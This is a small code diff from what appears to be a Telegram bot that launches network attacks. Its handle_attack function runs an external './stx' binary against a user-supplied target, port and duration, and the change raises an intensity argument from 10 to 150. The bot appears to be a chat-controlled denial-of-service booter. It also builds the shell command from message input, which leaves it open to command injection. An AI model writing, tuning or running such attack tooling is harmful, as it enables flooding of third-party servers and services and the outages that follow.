@@ -101,7 +101,7 @@ def handle_attack(message):
 
     # Attack Execution
     try:
-        subprocess.run(f"./stx 10 {time_duration} {target} {port}", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./stx 150 {time_duration} {target} {port}", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "✅ RUNNING AN ATTACK ! 🚨")
     except subprocess.CalledProcessError:
